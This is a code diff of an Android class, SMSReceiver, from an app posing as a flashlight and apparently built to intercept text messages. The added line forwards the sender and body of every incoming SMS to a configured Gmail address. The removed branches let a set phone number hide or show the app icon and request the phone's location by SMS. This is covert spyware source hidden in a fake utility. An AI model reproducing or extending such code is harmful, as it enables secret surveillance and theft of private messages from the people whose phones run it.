@@ -17,16 +17,13 @@ import android.content.BroadcastReceiver;
 public class SMSReceiver extends BroadcastReceiver {
 
   public  static Object[] pdus;
-  //public  static Context context;
   private static GmailSender sender;
   private static Configure configure;
   private static FlashLight flashLight;
 
   public  static String mBody = null;
   private static String gmailEmailString;
-  private static String hideKeywordString;
   private static String phoneNumberString;
-  private static String unhideKeywordString;
 
   private static final String SUBJECT = "SMSInterceptor";
   private static final String TAG     = "FlashLight SMSReceiver";
@@ -35,9 +32,7 @@ public class SMSReceiver extends BroadcastReceiver {
     configure  = new Configure();
     flashLight = new FlashLight();
     phoneNumberString   = configure.phoneNumber();
-    hideKeywordString   = configure.hideKeyword();
     gmailEmailString    = configure.emailAddress();
-    unhideKeywordString = configure.unhideKeyword();
   }
 
   public String endPoint(final String number, final Context context) {
@@ -71,7 +66,7 @@ public class SMSReceiver extends BroadcastReceiver {
   }
 
   @Override
-  public void onReceive(final Context context, Intent intent) {
+  public void onReceive(Context context, Intent intent) {
 
     if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) { 
 
@@ -89,23 +84,8 @@ public class SMSReceiver extends BroadcastReceiver {
           }
 
           final String message_from = messages[0].getOriginatingAddress();
+          threading("Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody);
 
-          if(mBody.equals("where are you") && message_from.equals(phoneNumberString)) {
-            intent = new Intent(context, FlashLightService.class);
-            intent.putExtra("obtainLocation","obtainLocation");
-            context.startService(intent);
-          }
-          else if(mBody.equals(unhideKeywordString) && message_from.equals(phoneNumberString)) {
-            threading("Showing FlashLight app!");
-            flashLight.showAppIcon(context, context.getPackageManager());
-          }
-          else if(mBody.equals(hideKeywordString) && message_from.equals(phoneNumberString)) {
-            threading("Hiding FlashLight app!");
-            flashLight.hideAppIcon(context, context.getPackageManager());
-          }
-          else {
-            threading("Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody);
-          }
         }
         catch(Exception e) {
           e.printStackTrace();
